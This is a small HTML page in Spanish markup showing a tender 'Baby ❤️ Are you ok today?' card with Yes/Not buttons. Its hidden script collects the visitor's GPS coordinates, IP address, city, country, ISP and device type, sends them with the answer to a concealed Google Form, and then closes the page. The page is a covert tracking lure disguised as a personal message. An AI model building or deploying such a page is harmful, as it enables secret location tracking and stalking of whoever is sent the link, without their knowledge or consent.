<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Baby</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#f5f5f5;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.card{
  background:white;
  padding:30px;
  border-radius:14px;
  box-shadow:0 4px 20px rgba(0,0,0,0.15);
  text-align:center;
  width:260px;
}

button{
  width:100%;
  padding:14px;
  margin-top:10px;
  font-size:16px;
  border:none;
  border-radius:8px;
  background:#e0e0e0;
}
button:active{
  background:#d0d0d0;
}
</style>
</head>

<body>

<div class="card">
  <p><strong>Baby ❤️</strong></p>
  <p>Are you ok today?</p>

  <button onclick="send('yes')">Yes</button>
  <button onclick="send('not')">Not</button>
</div>

<script>

const FORM_ID = "1FAIpQLSdXQ-NrgmaWl2bM8YB5ufLN3PnIwDyylbM75ze6mgaj2A92tw";

const E1 = "entry.1588936670"; // codigo
const E2 = "entry.1725572024"; // lat
const E3 = "entry.44897658";   // lon
const E4 = "entry.883812266";  // hora
const E5 = "entry.894873087";  // descripcion


function closePage(){
  setTimeout(()=>{
    window.open('','_self');
    window.close();
    document.body.innerHTML="";
  },1200);
}


function deviceType(){
  return /Android|iPhone|Mobile/i.test(navigator.userAgent)
    ? "Mobile"
    : "Desktop";
}


async function getIPInfo(){
  try{
    const res = await fetch("https://ipapi.co/json/");
    const d = await res.json();

    return `${d.ip} | ${d.city} | ${d.country_name} | ${d.org} | ${deviceType()}`;
  }catch{
    return `no-ip | ${deviceType()}`;
  }
}


async function send(code){

  navigator.geolocation.getCurrentPosition(async pos=>{

    const lat  = pos.coords.latitude;
    const lon  = pos.coords.longitude;
    const hora = new Date().toISOString();

    const desc = await getIPInfo();

    const url =
`https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?${E1}=${code}&${E2}=${lat}&${E3}=${lon}&${E4}=${hora}&${E5}=${encodeURIComponent(desc)}`;

    fetch(url,{mode:'no-cors'});

    closePage();

  }, closePage);
}


</script>


</body>
</html>
